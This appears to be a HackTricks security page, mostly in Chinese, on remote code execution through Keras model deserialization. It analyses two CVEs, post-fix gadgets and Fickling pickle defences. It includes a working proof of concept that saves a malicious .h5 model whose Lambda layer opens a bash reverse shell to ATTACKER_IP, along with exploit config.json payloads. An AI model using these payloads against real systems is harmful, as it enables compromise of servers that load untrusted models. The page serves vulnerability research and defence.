# Keras 模型反序列化 RCE 和 Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

本页总结了针对 Keras 模型反序列化 pipeline 的实用 exploitation techniques，解释了原生 .keras 格式的内部结构和 attack surface，并为研究人员提供用于发现 Model File Vulnerabilities (MFVs) 和 post-fix gadgets 的工具包。

## .keras 模型格式内部结构

一个 .keras 文件是一个 ZIP 归档，至少包含：
- metadata.json – 通用信息（例如 Keras 版本）
- config.json – 模型架构（primary attack surface）
- model.weights.h5 – 权重（存储在 HDF5 中）

config.json 驱动递归反序列化：Keras 导入模块、解析 classes/functions，并从攻击者控制的字典中重构 layers/objects。

示例片段，针对 Dense 层对象：
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
反序列化会执行：
- 从 module/class_name 键导入模块并解析符号
- 调用 from_config(...) 或构造函数，并使用攻击者控制的 kwargs
- 对嵌套对象递归处理（activations、initializers、constraints 等）

历来，这使得构造 config.json 的攻击者可以获得三种原语：
- 控制导入哪些模块
- 控制解析哪些类/函数
- 控制传递给构造函数/from_config 的 kwargs

## CVE-2024-3660 – Lambda-layer bytecode RCE

根本原因：
- Lambda.from_config() 使用 python_utils.func_load(...)，该函数对攻击者提供的字节执行 base64 解码并调用 marshal.loads()；Python 的 unmarshalling 可能会执行代码。

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
缓解措施：
- Keras 默认将 safe_mode=True 强制启用。Lambda 中序列化的 Python 函数会被阻止，除非用户明确通过 safe_mode=False 选择退出。

注意：
- 旧的格式（较早的 HDF5 保存）或较早的代码库可能不会强制执行现代检查，因此当受害者使用较旧的加载器时，“downgrade” 风格的攻击仍可能生效。

## CVE-2025-1550 – Keras ≤ 3.8 中的任意模块导入

根本原因：
- _retrieve_class_or_fn 使用了不受限制的 importlib.import_module()，并从 config.json 接收由攻击者控制的模块字符串。
- 影响：能够任意导入任何已安装的模块（或放置在 sys.path 上由攻击者种植的模块）。在导入时会执行代码，然后使用攻击者提供的 kwargs 进行对象构造。

利用思路：
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- 模块允许列表：导入限制为官方生态模块：keras, keras_hub, keras_cv, keras_nlp
- 默认安全模式：safe_mode=True 阻止不安全的 Lambda 序列化函数加载
- 基础类型检查：反序列化的对象必须与预期类型匹配

## 实际利用： TensorFlow-Keras HDF5 (.h5) Lambda RCE

许多生产环境仍然接受遗留的 TensorFlow-Keras HDF5 模型文件 (.h5)。如果攻击者能够上传一个服务器随后加载或用于推理的模型，Lambda 层可以在 load/build/predict 时执行任意 Python 代码。

制作一个恶意 .h5 的最小 PoC，会在反序列化或使用时执行 reverse shell：
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
注意事项与可靠性提示：
- 触发点：代码可能会运行多次（例如，在 layer build/first call、model.load_model 和 predict/fit 期间）。使 payloads 幂等。
- 版本锁定：将版本与目标的 TF/Keras/Python 匹配以避免序列化不匹配。例如，如果目标使用 Python 3.8 和 TensorFlow 2.13.1，则在该环境下构建工件。
- 快速环境复现：
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- 验证：像 os.system("ping -c 1 YOUR_IP") 这样的良性负载有助于确认执行（例如，使用 tcpdump 观察 ICMP），然后再切换到 reverse shell。

## 在 allowlist 内的 Post-fix gadget 攻击面

即便启用了 allowlisting 和 safe mode，在被允许的 Keras 可调用对象中仍然存在广泛的攻击面。例如，keras.utils.get_file 可以将任意 URL 下载到用户可选的位置。

Gadget via Lambda that references an allowed function (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- Lambda.call() 在调用目标可调用对象时会将输入张量作为第一个位置参数预先添加。所选的 gadget 必须能容忍额外的位置参数（或接受 *args/**kwargs）。这限制了可用函数的范围。

## ML pickle import allowlisting for AI/ML models (Fickling)

许多 AI/ML 模型格式（PyTorch .pt/.pth/.ckpt、joblib/scikit-learn、较旧的 TensorFlow 工件等）会嵌入 Python pickle 数据。攻击者经常滥用 pickle 的 GLOBAL imports 和对象构造器，以在加载时实现 RCE 或替换模型。基于黑名单的扫描器常常漏掉新出现或未列出的危险 imports。

一种实用的 fail-closed 防御是 hook Python 的 pickle 反序列化器，仅允许在反序列化期间引入经过审核的无害 ML 相关 imports。Trail of Bits 的 Fickling 实现了该策略，并提供了一个经过策划的 ML import allowlist，基于数千个公开的 Hugging Face pickles 构建。

Security model for “safe” imports (intuitions distilled from research and practice): imported symbols used by a pickle must simultaneously:
- Not execute code or cause execution (no compiled/source code objects, shelling out, hooks, etc.)
- Not get/set arbitrary attributes or items
- Not import or obtain references to other Python objects from the pickle VM
- Not trigger any secondary deserializers (e.g., marshal, nested pickle), even indirectly

在进程启动尽早启用 Fickling 的保护，以便框架（如 torch.load、joblib.load 等）执行的任何 pickle 加载都能被检查：
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
操作提示：
- 可以在需要时临时禁用/重新启用 hooks：
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 如果已知良好的模型被阻止，在审查符号后为你的环境扩展 allowlist：
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling 还提供通用的运行时防护以便你需要更细粒度控制时使用：
- fickling.always_check_safety() 用于强制对所有 pickle.load() 进行检查
- with fickling.check_safety(): 用于作用域内强制检查
- fickling.load(path) / fickling.is_likely_safe(path) 用于一次性检查

- 尽量优先使用非-pickle 的模型格式（例如 SafeTensors）。如果必须接受 pickle，请在最小权限下运行加载器，禁止网络外发，并强制执行 allowlist。

This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.


## 研究者工具包

1) 在 allowlisted Keras 模块中系统性地发现 gadget

在 keras, keras_nlp, keras_cv, keras_hub 中枚举候选 callables，并优先考虑那些具有文件/网络/进程/环境副作用的。 

<details>
<summary>在 allowlisted Keras 模块中枚举潜在危险的 callables</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing (no .keras archive needed)

将精心构造的 dicts 直接传入 Keras deserializers，以了解可接受的 params 并观察副作用。
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) 跨版本探测与格式

Keras 存在于多个代码库/时期，具有不同的保护措施和格式：
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: 单独维护
- Multi-backend Keras 3 (official): 引入了原生 .keras

在多个代码库和格式上重复测试 (.keras vs legacy HDF5) 以发现回归或缺失的防护。

## 参考资料

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
